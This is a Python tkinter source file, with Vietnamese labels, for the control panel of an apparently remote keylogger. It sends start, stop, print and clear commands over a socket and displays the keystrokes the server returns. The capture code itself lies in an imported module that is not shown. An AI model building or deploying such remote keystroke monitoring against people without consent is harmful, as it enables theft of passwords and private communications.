import tkinter as tk
from keylogger import Keylogger
from tkinter import scrolledtext
class KeyloggerUI(Keylogger):
    def __init__(self, socket, window):
        super().__init__(socket, window)
        self.keystroke_window = tk.Toplevel(self.window)
        self.keystroke_window.title("Keystroke Logger")
        self.keystroke_window.geometry("400x300")

        frame_keylog = tk.Frame(self.keystroke_window)
        frame_keylog.grid(row=0, column=0, columnspan=4, padx=10, pady=10)

        self.keylog_text = scrolledtext.ScrolledText(frame_keylog, width=45, height=10)
        self.keylog_text.pack(padx=5, pady=5)

        frame_buttons = tk.Frame(self.keystroke_window)
        frame_buttons.grid(row=1, column=0, columnspan=4, padx=10, pady=10)

        hook_button = tk.Button(frame_buttons, text="Hook", command=self.start_keylogger)
        unhook_button = tk.Button(frame_buttons, text="Unhook", command=self.stop_keylogger)
        print_button = tk.Button(frame_buttons, text="In Phím", command=self.print_keylog)
        clear_button = tk.Button(frame_buttons, text="Xóa", command=self.clear_keylog)

        hook_button.grid(row=0, column=0, padx=5, pady=5)
        unhook_button.grid(row=0, column=1, padx=5, pady=5)
        print_button.grid(row=0, column=2, padx=5, pady=5)
        clear_button.grid(row=0, column=3, padx=5, pady=5)
    
    def start_keylogger(self):
        self.send_message("start")

    def stop_keylogger(self):
        self.send_message("stop")

    def print_keylog(self):
        self.send_message("print")
        response = self.socket.recv(1024).decode()  # Đọc dữ liệu từ server
        print(response)
        if response:
            self.keylog_text.delete(1.0, tk.END)  # Xóa bất kỳ dữ liệu cũ nào trong ô text
            self.keylog_text.insert(tk.END, response)  # Hiển thị dữ liệu keylog trong ô text
    
    def clear_keylog(self):
        self.send_message("clear")

    def send_message(self, message):
        if not self.socket:
            print("Not connected to the server.")
            return
        try:
            # Send a message to the server
            self.socket.sendall(message.encode())
            print("Message sent.")
        except OSError:
            print("Failed to send the message.")